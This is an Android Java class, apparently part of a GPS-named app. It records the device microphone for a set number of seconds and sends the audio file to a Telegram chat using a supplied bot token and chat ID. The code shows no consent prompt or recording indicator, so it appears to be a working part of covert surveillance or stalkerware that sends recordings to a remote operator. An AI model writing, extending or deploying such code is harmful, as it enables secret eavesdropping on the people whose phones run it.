package com.example.gpsstandalone;

import android.content.Context;
import android.media.MediaRecorder;
import android.os.Handler;
import android.util.Log;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

public class VoiceRecorder {
    private static final String TAG = "VoiceRecorder";
    private static VoiceRecorder instance;

    private MediaRecorder recorder;
    private File outputFile;

    public static VoiceRecorder getInstance() {
        if (instance == null) instance = new VoiceRecorder();
        return instance;
    }

    public void startRecording(Context context, int seconds, String token, String chatId) {
        Log.d(TAG, "Mulai persiapan merekam suara selama " + seconds + " detik");

        try {
            outputFile = new File(context.getCacheDir(), "audio.3gp");
            if (outputFile.exists()) {
                boolean deleted = outputFile.delete();
                Log.d(TAG, "File sebelumnya dihapus: " + deleted);
            }

            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(outputFile.getAbsolutePath());

            recorder.prepare();
            recorder.start();

            Log.d(TAG, "Merekam ke: " + outputFile.getAbsolutePath());

            // Stop setelah X detik
            new Handler().postDelayed(() -> stopRecording(context, token, chatId), seconds * 1000L);

        } catch (IOException e) {
            Log.e(TAG, "IOException saat merekam: " + e.getMessage(), e);
        } catch (IllegalStateException e) {
            Log.e(TAG, "IllegalStateException saat merekam: " + e.getMessage(), e);
        } catch (Exception e) {
            Log.e(TAG, "Exception umum saat mulai rekam: " + e.getMessage(), e);
        }
    }

    private void stopRecording(Context context, String token, String chatId) {
        Log.d(TAG, "Memproses stopRecording...");

        try {
            if (recorder != null) {
                recorder.stop();
                recorder.reset();
                recorder.release();
                recorder = null;

                Log.d(TAG, "Rekaman dihentikan dan MediaRecorder dilepas");
            }

            if (outputFile == null || !outputFile.exists()) {
                Log.e(TAG, "File rekaman tidak ditemukan");
                return;
            }

            long fileSize = outputFile.length();
            Log.d(TAG, "Ukuran file rekaman: " + fileSize + " bytes");

            if (fileSize < 1000) {
                Log.e(TAG, "File terlalu kecil, kemungkinan kosong atau gagal rekam");
                return;
            }

            // Kirim voice ke Telegram
            Log.d(TAG, "Mengirim ke Telegram...");
            TelegramHelper telegramHelper = new TelegramHelper(context);
            telegramHelper.sendVoice(token, chatId, outputFile);

        } catch (IllegalStateException e) {
            Log.e(TAG, "IllegalStateException saat stop: " + e.getMessage(), e);
        } catch (RuntimeException e) {
            Log.e(TAG, "RuntimeException saat stop: " + e.getMessage(), e);
        } catch (Exception e) {
            Log.e(TAG, "Exception saat stopRecording: " + e.getMessage(), e);
        }
    }
}
